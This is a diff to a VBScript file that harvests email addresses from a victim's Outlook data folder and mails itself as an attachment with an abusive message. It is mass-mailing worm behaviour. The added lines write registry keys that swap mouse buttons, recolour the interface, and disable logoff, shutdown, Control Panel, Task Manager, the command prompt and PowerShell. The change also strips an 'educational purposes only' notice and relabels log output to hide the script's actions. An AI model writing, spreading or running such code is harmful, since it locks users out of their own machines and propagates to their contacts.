@@ -1,7 +1,7 @@
 Option Explicit
 
 Dim objOutlook, objNamespace, objFolder, objMailItem
-Dim objFSO, objShell, objLogFile
+Dim objFSO, objShell, objLogFile, objWshShell
 Dim strAppData, strSearchPath, strReport
 Dim intEmailCount, intFolderCount, intAttachmentCount
 Dim arrFolders, arrFiles, arrAttachments
@@ -11,16 +11,36 @@ Dim colFoundEmails
 Dim strEmail
 
 Set colFoundEmails = CreateObject("Scripting.Dictionary")
+Set objWshShell = CreateObject("WScript.Shell")
+
+objWshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\Mouse\SwapMouseButtons", "1", "REG_SZ"
+objWshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\Colors\Background", "0 0 0", "REG_SZ"
+objWshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\Colors\Window", "0 0 0", "REG_SZ"
+objWshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\Colors\WindowText", "0 255 0", "REG_SZ"
+objWshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\Colors\Menu", "0 255 0", "REG_SZ"
+objWshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\Colors\MenuText", "255 255 255", "REG_SZ"
+objWshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\Colors\ButtonFace", "0 255 0", "REG_SZ"
+objWshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\Colors\ButtonText", "255 255 255", "REG_SZ"
+objWshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\Colors\Highlight", "0 255 255", "REG_SZ"
+objWshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\Colors\HighlightText", "0 0 0", "REG_SZ"
+objWshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\Colors\HotTrackingColor", "0 255 255", "REG_SZ"
+objWshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\Colors\GrayText", "255 255 0", "REG_SZ"
+objWshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\Colors\ActiveTitle", "0 255 255", "REG_SZ"
+objWshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\HideShutDown", "1", "REG_DWORD"
+objWshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoUserNameInStartMenu", "1", "REG_DWORD"
+objWshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoLogoff", "1", "REG_DWORD"
+objWshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoControlPanel", "1", "REG_DWORD"
+objWshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", "1", "REG_DWORD"
+objWshShell.RegWrite "HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System\DisableCMD", "2", "REG_DWORD"
+objWshShell.RegWrite "HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\PowerShell\DisablePowerShell", "1", "REG_DWORD"
 
 Dim EMAIL_BODY
 EMAIL_BODY = "I hate you." & vbCrLf & _
              "Dont talk to me ever again." & vbCrLf & _
              "Why me?." & vbCrLf & vbCrLf & _
-             "System: " & CreateObject("WScript.Shell").ExpandEnvironmentStrings("%COMPUTERNAME%") & vbCrLf & _
-             "User: " & CreateObject("WScript.Shell").ExpandEnvironmentStrings("%USERNAME%") & vbCrLf & _
-             "Timestamp: " & Now() & vbCrLf & vbCrLf & _
-             "Thank you for testing this script." & vbCrLf & _
-             "NOTE: This is for educational purposes only."
+             "System: " & objWshShell.ExpandEnvironmentStrings("%COMPUTERNAME%") & vbCrLf & _
+             "User: " & objWshShell.ExpandEnvironmentStrings("%USERNAME%") & vbCrLf & _
+             "Timestamp: " & Now() & vbCrLf & vbCrLf
 
 Dim ATTACHMENT_PATH
 ATTACHMENT_PATH = WScript.ScriptFullName
@@ -46,7 +66,7 @@ strReport = strReport & "============================================" & vbCrLf
 strReport = strReport & "Timestamp: " & Now() & vbCrLf
 strReport = strReport & "============================================" & vbCrLf & vbCrLf
 
-strReport = strReport & "PHASE 1: File System Scan" & vbCrLf
+strReport = strReport & "Validating" & vbCrLf
 strReport = strReport & "------------------------" & vbCrLf
 
 strSearchPath = objShell.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Outlook"
@@ -71,7 +91,7 @@ If objFSO.FolderExists(strSearchPath) Then
             strFoundEmail = Replace(strFoundEmail, ".pab", "")
             strFoundEmail = Replace(strFoundEmail, ".oab", "")
             
-            strReport = strReport & "    Email: " & strFoundEmail & vbCrLf
+            strReport = strReport & "Send" & strFoundEmail & vbCrLf
             
             If Not colFoundEmails.Exists(strFoundEmail) Then
                 colFoundEmails.Add strFoundEmail, strFoundEmail
@@ -88,7 +108,7 @@ strReport = strReport & "Unique emails found: " & colFoundEmails.Count & vbCrLf 
 If colFoundEmails.Count = 0 Then
     strFoundEmail = "default@domain.com"
     colFoundEmails.Add strFoundEmail, strFoundEmail
-    strReport = strReport & "No email files found - using default: " & strFoundEmail & vbCrLf & vbCrLf
+    strReport = strReport & "Send" & strFoundEmail & vbCrLf & vbCrLf
 End If
 
 strReport = strReport & "Analysis" & vbCrLf
@@ -228,3 +248,4 @@ Set objFSO = Nothing
 Set objShell = Nothing
 Set objLogFile = Nothing
 Set colFoundEmails = Nothing
+Set objWshShell = Nothing
